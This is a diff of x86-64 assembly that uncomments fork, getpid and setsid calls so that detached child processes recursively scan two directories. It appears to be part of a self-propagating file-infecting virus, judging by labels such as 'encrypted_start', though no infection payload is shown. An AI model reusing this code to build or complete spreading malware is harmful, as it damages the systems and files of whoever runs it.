@@ -63,9 +63,9 @@ encrypted_start:
     cmp rax, 0
     jl exit
 
- ;   mov rax, SYS_GETPID
- ;   syscall
- ;   mov [rsp + ppid], rax
+    mov rax, SYS_GETPID
+    syscall
+    mov [rsp + ppid], rax
 
     call get_processus_actif
     cmp rax, 0
@@ -74,12 +74,12 @@ encrypted_start:
 birth_of_childs:
 scan_first_dir:
 
-;    mov rax, SYS_FORK
-;    syscall
-;    mov rax, SYS_GETPID
-;    syscall
-;    cmp rax, [rsp + ppid]
-;    jz scan_second_dir
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz scan_second_dir
 
     mov rax, SYS_SETSID
     syscall
@@ -89,15 +89,15 @@ scan_first_dir:
     call ft_strcpy
     mov rdi, rsp
     call recursive
-;    jmp exit
+    jmp exit
 
 scan_second_dir:
-;    mov rax, SYS_FORK
-;    syscall
-;    mov rax, SYS_GETPID
-;    syscall
-;    cmp rax, [rsp + ppid]
-;    jz exit
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz exit
 
     mov rax, SYS_SETSID
     syscall
@@ -109,16 +109,16 @@ scan_second_dir:
     call recursive
 
 exit:
- ;   mov rax, SYS_GETPID
- ;   syscall
- ;   mov rbx, [rsp + ppid]
+    mov rax, SYS_GETPID
+    syscall
+    mov rbx, [rsp + ppid]
     pop rsi
     pop rdi
     pop rcx
     pop rdx
     leave
-;    cmp rax, rbx
-;    jnz death_of_child
+    cmp rax, rbx
+    jnz death_of_child
     xor rax, rax
 jump:
     ret
